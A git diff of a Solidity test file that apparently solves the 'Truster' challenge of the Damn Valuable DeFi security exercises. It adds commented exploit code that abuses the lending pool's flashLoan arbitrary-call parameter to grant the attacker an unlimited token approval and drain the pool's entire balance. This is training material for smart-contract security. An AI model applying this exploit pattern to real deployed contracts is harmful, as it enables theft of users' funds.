@@ -51,6 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
+        // deploy contract and call run() within constructor so it is all done in one tx from the player
         new ChallengeSolver(token, pool, recovery);
     }
 
@@ -75,22 +76,28 @@ contract ChallengeSolver {
     DamnValuableToken dvt;
     TrusterLenderPool lp;
     address recoveryAddress;
-    uint256 amountToRecover = 1_000_000 ether;
 
     constructor(DamnValuableToken _dvt, TrusterLenderPool _lp, address _recovery) {
         dvt = _dvt;
         lp = _lp;
         recoveryAddress = _recovery;
+        // call run in constructor to make sure player address only uses one tx to solve challenge
         run();
     }
 
     function run() public {
+        // take out flashloan
         lp.flashLoan({
+            // send amount 0 to address(0) so nothing happens and we dont have to repay anything
             amount: 0,
             borrower: address(0),
+            // call DamnValuableToken as target in flashloan
             target: address(dvt),
+            // set infinate approval for this address through the context of the TrusterLenderPool contract during flashloan
             data: abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
         });
-        dvt.transferFrom(address(lp), recoveryAddress, amountToRecover);
+
+        // transfer all tokens from TrusterLenderPool to recovery address since we got an infinate approval through the flashloan
+        dvt.transferFrom(address(lp), recoveryAddress, dvt.balanceOf(address(lp)));
     }
 }
